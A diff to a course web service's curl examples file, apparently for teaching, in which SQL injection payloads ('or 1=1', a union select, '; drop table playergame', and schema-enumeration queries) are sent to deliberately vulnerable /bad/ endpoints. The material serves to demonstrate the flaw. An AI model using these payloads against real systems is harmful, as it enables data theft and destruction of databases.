@@ -21,14 +21,17 @@ curl --request DELETE \
 
 -- SQL injection examples (only work when /bad/* endpoints are enabled)
 
-# URL: https://cs262-webservice-abebhtekgegdb2as.canadacentral-01.azurewebsites.net/bad/players/1 or 1=1
+# URL: .../bad/players/1 or 1=1
 curl --request GET \
         ${SERVICE_URL}/bad/players/1%20or%201=1
 
-# URL: https://cs262-webservice-abebhtekgegdb2as.canadacentral-01.azurewebsites.net/bad/players/1 union select * from player
+# URL: .../bad/players/1 union select * from player
 curl --request GET \
         ${SERVICE_URL}/bad/players/1%20union%20select%20*%20from%20player
 
-# URL: https://cs262-webservice-abebhtekgegdb2as.canadacentral-01.azurewebsites.net/bad/players/1; drop table playergame
+# URL: .../bad/players/1; drop table playergame
 curl --request GET \
         ${SERVICE_URL}/bad/players/1%3B%20drop%20table%20playergame
+
+# URL: .../bad/players/1; select * from pg_tables where tableowner = 'kvlinden';
+# URL: .../bad/players/1; select table_name,column_name,data_type from information_schema.columns where table_name='player';
